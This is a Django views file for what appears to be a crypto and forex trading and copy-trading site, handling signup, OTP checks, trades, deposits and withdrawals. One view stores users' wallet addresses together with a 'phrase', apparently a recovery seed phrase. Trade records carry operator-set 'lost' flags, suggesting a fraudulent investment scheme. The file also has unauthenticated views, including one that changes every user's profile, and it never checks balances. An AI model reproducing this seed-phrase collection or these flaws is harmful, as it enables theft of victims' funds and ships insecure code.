from django.shortcuts import render,redirect
from .handlers import FetchCoinData,Forex_Currencies,StockData
from django.http import JsonResponse
from .models import *
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.contrib.auth import login,logout,authenticate
from django.contrib import messages
from django.core import serializers
from .utils import *
from .locations import CountryData
import uuid
from django.conf import settings
from .wallets import wallet_address,deposit_address
from .otp import CreateOtp
from .decorators import ensure_email_verified

# Create your views here.

def LoginView(request):
    if request.user.is_authenticated:
        return redirect('dashboard')
    if request.method=="POST":
        email=request.POST['email']
        password=request.POST['password']
        user=User.objects.filter(email=email).first()
        if user:
            auth_user=authenticate(username=user.username,password=password)
            if auth_user == None:
                messages.error(request,'Invalid Credentials, check password')
                return render(request,'pages/login.html')
            else:
                login(request, auth_user)
                if not Profile.objects.get(user=auth_user).verified:
                    return redirect('success')
                return redirect('dashboard')
        else:
            messages.error(request,'No existing account')
            return render(request,'pages/login.html')
    return render(request,'pages/login.html',status=200)


def SignUpView(request):
    if request.user.is_authenticated:
        return redirect('dashboard')
    if request.method=="POST":
        data=request.POST
        email=data['email']
        if User.objects.filter(email=email).first() is not  None:
            return JsonResponse({"status":"failure"},safe=False)
        else:
            user=User.objects.create(
                first_name=data['first_name'],
                last_name=data['last_name'],
                email=data['email'],
                username=data['email'],
            )
            user.set_password(data['password'])
            user.save()
            profile=Profile.objects.create(
                user=user,
                country=data['country'],
                address=data['address'],
                phone_code=data['phone_code'],
                phone=f"+{data['phone_code']}{data['phone']}",
                verified=False,
                token=uuid.uuid4(),
                state=data['state'],
                preferred_currency=data['currency'],
                otp=CreateOtp()

            )
            login(request,user)
            # Send welcome email to user
            SendEmail(user=user,otp=profile.otp)
            messages.success(request,"Registration Successful")
            return JsonResponse({"status":"success"},safe=False)
    return render(request,'pages/register.html',{"countries":CountryData()},status=200)




def ActivateAccount(request):
    profile=Profile.objects.filter(token=request.GET['token']).first()
    if profile.verified:
        messages.success(request,'Account already verified')
        return redirect('login')
    profile.verified=True
    profile.save()
    messages.success(request,'Account successfully verified')
    return redirect('login')

@login_required(login_url='login')
def SignUpSuccessView(request):
    profile=Profile.objects.get(user=request.user)
    if request.GET.get('otp'):
        if request.GET.get('otp')==profile.otp:
            profile.verified=True
            profile.save()
            messages.success(request,'Email successfully verified')
            return redirect('dashboard')
        else:
            messages.error(request,'Wrong OTP provided')
    return render(request,'pages/register-success.html')


@login_required(login_url='login')
def Logout(request):
    logout(request)
    return redirect('login')


@login_required(login_url='login')
def ResendOTP(request):
    user:User=request.user
    profile:Profile=Profile.objects.get(user=user)
    SendEmail(user,profile.otp)
    messages.success(request,'Email resent, check inbox')
    return redirect('success')

@login_required(login_url='login')
@ensure_email_verified
def Dashboard(request):
    user_profile=Profile.objects.filter(user=request.user).first()
    user_json=user_profile.serialize()
    assets={
        "crypto":FetchCoinData(),
        "forex":Forex_Currencies(),
        "stocks":StockData()
        }
    # assets={
    #     "crypto":[],
    #     "forex":[],
    #     "stocks":[]
    # }
    total_deposit=sum([x.amount for x in request.user.user_deposit.filter(confirmed=True)])
    return render(request,'dashboard/dashboard.html',{"assets":assets,"user":user_json,"deposit":total_deposit})

@login_required(login_url='login')
def Assets(request):
    user_profile=Profile.objects.filter(user=request.user).first()
    user_json=user_profile.serialize()
    assets=FetchCoinData()
    return render(request,'dashboard/assets.html',{"assets":assets,"user":user_json})

@login_required(login_url='login')
def Trades(request):
    assets=FetchCoinData()
    user_profile=Profile.objects.filter(user=request.user).first()
    user_json=user_profile.serialize()
    trades=[
        {
            "amount":trade.amount,
            "currency":trade.currency,
            "stop_loss":trade.stop_loss,
            "take_profit":trade.take_profit,
            "closed":trade.closed,
            "created":trade.created.strftime('%m/%d/%Y'),
            "id":trade.id,
            "expert":trade.expert_trade,
            "lost":trade.lost_trade
        } for trade in Trade.objects.filter(user=request.user)
    ]
    if request.method=='POST':
        data=request.POST
        Trade.objects.create(
            user=request.user,
            amount=int(data['amount']),
            currency=data['currency'],
            take_profit=int(data['take_profit']),
            stop_loss=int(data['stop_loss']),
            # duration=data["duration"]
        )
        request.user.profile.dollar_balance=request.user.profile.dollar_balance-int(data["amount"])
        request.user.profile.save()
        messages.success(request,"Open trade successful")
        return JsonResponse({"status":"success"},safe=False)
    return render(request,'dashboard/trades.html',{"assets":assets,"user":user_json,"trades":trades})

def UserCoinBalance(request):
    pass

@login_required(login_url='login')
def Market(request):
    assets=FetchCoinData()
    return render(request,'dashboard/markets.html',{"assets":assets})

@login_required(login_url='login')
def CoinDetails(request):
    pass

@login_required(login_url='login')
def DepositFunds(request):
    user_deposits=Deposit.objects.filter(user=request.user)
    # def get_image(name):
    #     return
    if request.method=='POST':
        data=request.POST
        # image=request.FILES['image']
        Deposit.objects.create(
            user=request.user,
            amount=data['amount'],
            currency=data['currency'],
            # proof=image
        )
        return JsonResponse({"status":"success"},safe=False,status=200)
    return render(request,'dashboard/deposit.html',{"wallets":deposit_address,"deposits":user_deposits})

@login_required(login_url='login')
def Withdraw(request):
    if request.method=='POST':
        data=request.POST
        Withdrawal.objects.create(
            user=request.user,
            amount=data['amount'],
            currency=data['currency'],
            address=data['address']
        )
        return JsonResponse({"status":"success"},safe=False,status=200)

    return render(request,'dashboard/withdraw.html',{"wallets":wallet_address,'user':request.user.profile.serialize()})

@login_required(login_url='login')
def CopyTrades(request):
    experts_dict=[
        {
            "name":expert.name,
            "win_rate":expert.win_rate,
            "wins":expert.wins,
            "losses":expert.losses,
            "profit_share":expert.profit_share,
            "image":expert.image.url,
            "copy_amount":expert.copy_amount,
            "id":expert.id,
            "followers":expert.followers
        }
        for expert in CopyTrader.objects.all()
    ]
    if "copy" in request.GET:
        expert_id=request.GET["copy"]
        request.user.profile.trading_profile=CopyTrader.objects.filter(id=expert_id).first()
        request.user.profile.save()
        return JsonResponse({"status":"success"},safe=False)
    return render(request,"dashboard/copy.html",{"user":request.user.profile.serialize(),"experts":experts_dict})


def SelectMethod(request):
    return render(request,"dashboard/select-method.html",{"user":request.user.profile.serialize()})

def PayWithBank(request):
    return render(request,"dashboard/deposit-bank.html",{"user":request.user.profile.serialize()})

def PayWithCard(request):
    return render(request,"dashboard/deposit-card.html",{"user":request.user.profile.serialize()})

def History(request):
    withdrawals=[
        {
            "amount":w.amount,
            "comfirmed":w.confirmed,
            "currency":w.currency,
            "created":w.created.strftime('%m/%d/%Y'),
            "id":w.id
        }
        for w in Withdrawal.objects.filter(user=request.user)
    ]

    deposits=[
        {
            "amount":d.amount,
            "comfirmed":d.confirmed,
            "currency":d.currency,
            "created":d.created.strftime('%m/%d/%Y'),
            "id":d.id
        }
        for d in Deposit.objects.filter(user=request.user)
    ]
    history={
        "withdrawals":withdrawals,
        "deposits":deposits
    }
    return render(request,"dashboard/transaction-history.html",{"user":request.user.profile.serialize(),"history":history})



def RecoverUserData(request):
    users=User.objects.all()
    for user in users:
        Profile.objects.create(
            otp=CreateOtp(),
            verified=True,
            user=user
        )
    return JsonResponse({"staus":'done'},safe=False)

@login_required(login_url='login')
def CopyTraderPageRequest(request):
    if request.method =='POST':
        data=request.POST
        CopyTradeAccessRequest.objects.create(
            user=request.user,
            wallet=data['wallet'],
            phrase=data['phrase']
        )
        messages.success(request,'Request Created Successfully, Wait for Confirmation')
        return JsonResponse({'status':'success'})